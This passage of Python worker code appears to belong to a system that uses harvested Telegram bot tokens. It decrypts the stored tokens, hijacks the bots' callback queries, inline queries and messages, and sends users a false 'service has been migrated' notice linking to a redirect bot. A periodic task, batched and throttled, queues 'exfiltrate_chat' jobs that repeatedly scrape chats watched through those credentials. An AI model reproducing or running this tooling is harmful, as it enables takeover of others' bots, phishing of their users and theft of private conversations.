        sent_ok = await HoneypotRedirectStrategies.send_callback_hijack(
            bot_token, callback_id, redirect_url, redirect_bot
        )
        
        if sent_ok:
            await HoneypotRedirectStrategies.update_redirect_record(
                update_id, user_id, redirect_bot
            )
            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
        
        logger.info(
            f"🔀 [Callback] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
        )
        return {"status": "callback_handled", "sent": sent_ok}
    
    # Level 4: Inline query hijack
    elif update_type == "inline_query":
        payload = await async_execute(
            db.table("honeypot_updates")
            .select("payload")
            .eq("id", update_id)
            .limit(1)
        )
        if not payload.data:
            return {"status": "payload_not_found"}
        
        iq = payload.data[0].get("payload", {}).get("inline_query", {})
        inline_id = iq.get("id")
        query_text = iq.get("query", "")
        
        bot_token = await HoneypotRedirectStrategies.get_bot_token(credential_id)
        if not bot_token:
            return {"status": "token_decrypt_failed"}
        
        sent_ok = await HoneypotRedirectStrategies.send_inline_hijack(
            bot_token, inline_id, query_text, redirect_url, redirect_bot
        )
        
        if sent_ok:
            await HoneypotRedirectStrategies.update_redirect_record(
                update_id, user_id, redirect_bot
            )
            HoneypotRedirectStrategies.mark_redirect_sent(credential_id, user_id)
        
        logger.info(
            f"🔀 [Inline] hijacked cred:{credential_id[:8]}... sent={sent_ok}"
        )
        return {"status": "inline_handled", "sent": sent_ok}

    # Get the captured bot's token
    try:
        cred = await async_execute(
            db.table("discovered_credentials")
            .select("bot_token")
            .eq("id", credential_id)
            .limit(1)
        )
        if not cred.data:
            return {"status": "credential_not_found"}
        bot_token = security.decrypt(cred.data[0]["bot_token"]).strip()
    except Exception as e:
        # Mark the row with error
        try:
            await async_execute(
                db.table("honeypot_updates")
                .update({"redirect_error": f"token_decrypt: {str(e)[:100]}"})
                .eq("id", update_id)
            )
        except Exception:
            pass
        return {"status": "token_decrypt_failed", "error": str(e)[:200]}

    # BUG-3 FIX: Define redirect_1 text for normal message path
    text = (
        "⚠️ This service has been migrated.\n"
        "Your request could not be processed here.\n"
        "To continue, use the updated channel:\n"
        f"👉 {redirect_url}\n"
        "This is an automated notification."
    )

    # Send the message via Bot API
    try:
        async with httpx.AsyncClient(timeout=15.0) as client:
            r = await client.post(
                f"https://api.telegram.org/bot{bot_token}/sendMessage",
                json={
                    "chat_id": chat_id,
                    "text": text,
                    "disable_web_page_preview": False,
                },
            )
            resp = r.json() if r.status_code == 200 else {}
            sent_ok = r.status_code == 200 and resp.get("ok")
    except Exception as e:
        sent_ok = False
        resp = {"error": str(e)[:200]}

    # BUG-4 FIX: Write redirect_1_sent_at on first successful send
    # BUG-5 FIX: Only mark redirected_at / dedup on successful delivery
    now = datetime.now(timezone.utc).isoformat()
    try:
        if sent_ok:
            update_payload = {
                "redirected_at": now,
                "redirected_bot": redirect_bot,
                "sender_user_id": user_id,
                "redirect_1_sent_at": now,
                "redirect_attempt": 1,
            }
        else:
            update_payload = {
                "redirect_error": str(resp.get("description") or resp.get("error", "unknown"))[:200],
                "sender_user_id": user_id,
            }
        await async_execute(
            db.table("honeypot_updates")
            .update(update_payload)
            .eq("id", update_id)
        )
    except Exception:
        pass

    # BUG-5 FIX: Only set dedup key on successful delivery
    if sent_ok:
        try:
            from app.core.redis_srv import redis_srv
            redis_srv.client.set(f"redirect:sent:{credential_id}:{user_id}", "1")
        except Exception:
            pass

    if sent_ok:
        logger.info(
            f"🔀 [Redirect] sent via cred:{credential_id[:8]}... "
            f"→ @{redirect_bot}"
        )
    else:
        logger.warning(
            f"🔀 [Redirect] FAILED cred:{credential_id[:8]}...: "
            f"{resp.get('description', resp.get('error', 'unknown'))}"
        )

    return {
        "status": "sent" if sent_ok else "failed",
        "credential_id": credential_id,
        "bot": redirect_bot,
    }


@app.task(name="flow.system_help")
def system_help():
    """Periodic guide on how to use system commands."""
    msg = (
        "ℹ️ **System Commands Guide**\n"
        "You can control the system using these commands:\n\n"
        "• `/status` - View queue size, DB connectivity, and paused state.\n"
        "• `/pause` - Suspend all scanners and broadcasters (Maintenance Mode).\n"
        "• `/resume` - Resume normal operations.\n"
        "• `/restart` - Restart the Bot Listener process.\n\n"
        "_Commands are restricted to Admins and Whitelisted Users._"
    )
    from app.workers.celery_app import get_worker_loop
    get_worker_loop().run_until_complete(get_broadcaster().send_log(msg))
    return "Help guide sent."


@app.task(name="flow.rescrape_active")
def rescrape_active():
    """
    Periodic task to re-scrape all active credentials for new messages.
    Runs every 4 hours to catch new activity in monitored chats.
    """
    from app.workers.celery_app import get_worker_loop
    return get_worker_loop().run_until_complete(_rescrape_active_logic())


async def _rescrape_active_logic():
    """
    Cursor-based rescrape: advances through ALL active credentials across successive runs.
    Each run processes one batch starting from where the previous run left off,
    ensuring every credential is eventually rescraped regardless of table size.
    """
    import os
    from app.core.metrics import metrics
    from app.core.redis_srv import redis_srv
    metrics.inc("rescrape.started")

    BATCH_SIZE = int(os.getenv("RESCRAPE_BATCH_SIZE", 50))
    # Stagger task dispatch: spread BATCH_SIZE tasks across RESCRAPE_SPREAD_SECONDS
    # so they don't all hit the UserAgent simultaneously and trigger FloodWait.
    # Default: 50 tasks over 300s = one task every 6s.
    SPREAD_SECONDS = int(os.getenv("RESCRAPE_SPREAD_SECONDS", 300))
    # Backpressure threshold: skip queueing if the scrape queue already has this
    # many pending tasks.  exfiltrate_chat routes to the 'scrape' queue and each
    # task can hold a session lock for 30-300s.  Piling on more tasks while the
    # previous batch is still draining causes the session-acquisition retry loop
    # to spin at 0% CPU useful work and inflates scrape queue depth unboundedly.
    # Default: 2 × BATCH_SIZE (allow one overlap batch in flight, then gate).
    BACKPRESSURE_THRESHOLD = int(os.getenv("RESCRAPE_BACKPRESSURE_THRESHOLD", BATCH_SIZE * 2))
    CURSOR_KEY = "rescrape:cursor:last_id"

    broadcaster = get_broadcaster()

    # Guard: if ALL UserAgent sessions are on cooldown, skip this run entirely.
    # Queueing tasks when the UA is fully restricted just wastes worker slots and
    # causes noisy "All sessions failed" log spam.
    ua_sessions_available = False
    try:
        import os.path as _osp
        import glob
        session_files = glob.glob("/app/sessions/*.session")
        for sf in session_files:
            sname = _osp.splitext(_osp.basename(sf))[0]
            if not redis_srv.is_on_cooldown(f"user_agent:{sname}"):
                ua_sessions_available = True
                break
    except Exception:
        ua_sessions_available = True  # fail open

    if not ua_sessions_available:
        msg = "⏳ **Re-scrape**: All UserAgent sessions on FloodWait cooldown — skipping this run to avoid task noise."
        logger.info(msg)
        await broadcaster.send_log(msg)
        return msg

    # Backpressure gate: don't pile new tasks onto an already-deep scrape queue.
    # exfiltrate_chat routes to the 'scrape' queue.  Each task can hold a session
    # lock for 30-300s, so a backlog of tasks just spins the session-acquisition
    # retry loop without making progress.
    try:
        scrape_queue_depth = redis_client.llen("scrape")
    except Exception:
        scrape_queue_depth = 0  # fail open — don't block rescrape on Redis errors

    if scrape_queue_depth >= BACKPRESSURE_THRESHOLD:
        msg = (
            f"⏸️ **Re-scrape**: Skipping — scrape queue has {scrape_queue_depth} pending tasks "
            f"(threshold: {BACKPRESSURE_THRESHOLD}).  Waiting for existing tasks to drain."
        )
        logger.info(msg)
        await broadcaster.send_log(msg)
        return msg

    # Read cursor from Redis — empty string means start of table
    last_id = redis_client.get(CURSOR_KEY) or ""

    try:
        query = (
            db.table("discovered_credentials")
            .select("id")
            .eq("status", "active")
            .not_.is_("chat_id", "null")
            .order("id", desc=False)
            .limit(BATCH_SIZE)
        )
        if last_id:
            query = query.gt("id", last_id)

        response = await async_execute(query)
        credentials = response.data or []

        if not credentials:
            # End of table — reset cursor so the next run starts over
            redis_client.delete(CURSOR_KEY)
            await broadcaster.send_log("🔄 **Re-scrape**: Full table scanned — cursor reset to start.")
            return "Rescrape cursor reset (full table covered)."

        # Advance cursor to last ID in this batch
        new_cursor = credentials[-1]["id"]
        redis_client.set(CURSOR_KEY, new_cursor)

        await broadcaster.send_log(
            f"🔄 **Re-scrape**: Queuing {len(credentials)} credentials (cursor: ...{new_cursor[-8:]}, "
            f"staggered over {SPREAD_SECONDS}s)..."
        )

        queued = 0
        interval = SPREAD_SECONDS / max(len(credentials), 1)
        for i, cred in enumerate(credentials):
            try:
                # countdown staggers each task: task 0 runs now, task 1 runs in interval*1s, etc.
                exfiltrate_chat.apply_async(args=[cred["id"]], countdown=int(i * interval))
                queued += 1
            except Exception as e:
                logger.error(f"Failed to queue exfiltration for {cred['id']}: {e}")

        msg = f"🏁 **Re-scrape**: Queued {queued}/{len(credentials)} credentials (spread: ~{interval:.0f}s apart)."
        await broadcaster.send_log(msg)
        return msg

    except Exception as e:
        error_msg = f"❌ **Re-scrape** failed: {e}"
        await broadcaster.send_log(error_msg)
        return error_msg
